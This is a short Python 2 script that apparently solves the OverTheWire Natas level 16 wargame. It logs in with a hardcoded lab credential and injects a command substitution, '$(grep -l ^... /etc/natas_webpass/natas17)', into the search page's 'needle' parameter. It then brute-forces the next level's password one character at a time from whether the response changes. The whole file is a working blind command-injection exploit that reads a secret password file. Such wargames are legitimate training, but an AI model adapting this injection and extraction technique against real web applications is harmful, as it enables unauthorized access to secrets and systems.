import subprocess
import os
import urllib

start = ''

asciichars = list(range(0x30, 0x3a) + range(0x41, 0x5b) + range(0x61, 0x7b))

while True:
    found = False
    for i in asciichars:
        trycmd = "hello$(grep -l ^%s /etc/natas_webpass/natas17)" % (start + chr(i))
        print "trying", repr(trycmd)
        out = subprocess.check_output("""curl --basic -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh http://natas16.natas.labs.overthewire.org/?needle='~~~' 2>/dev/null """.replace("~~~", urllib.quote_plus(trycmd)), shell=True)
        if "hello" not in out:
            start += chr(i)
            found = True
            break
    if not found:
        break

print "!!!", start

